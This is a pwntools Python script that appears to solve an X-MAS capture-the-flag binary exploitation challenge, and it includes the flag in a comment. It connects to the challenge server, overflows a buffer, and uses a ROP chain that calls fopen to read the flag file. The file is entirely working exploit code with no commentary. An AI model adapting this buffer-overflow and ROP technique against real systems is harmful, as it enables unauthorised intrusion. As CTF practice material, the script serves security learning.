#!/usr/bin/env python
from pwn import *

# X-MAS{r34d1n6_f0rb1dd3n_b00k5_15_50_much_fun}

e = ELF( './elf5' )
context.arch = 'amd64'

host , port = '199.247.6.180' , 10004
y = remote( host , port )

pop_rdi = 0x4014f3
pop_rsi_r15 = 0x4014f1
name = 0x4040E0

y.sendlineafter( 'open:' , '/proc/self/fd/0\x00flag\x00' )
y.sendlineafter( '(y/n)' , 'n' )

d = 0x4020F7
mode = 0x4020FA

p = flat(
    'a' * 0x200,
    0x4040A0 + 0x400,
    pop_rdi,
    name + 0x10,
    pop_rsi_r15,
    mode,
    0,
    e.plt[ 'fopen' ],
    0x40140E,
)

y.sendlineafter( 'read:' , str( len( p ) ) )

y.sendline( p )

y.interactive()
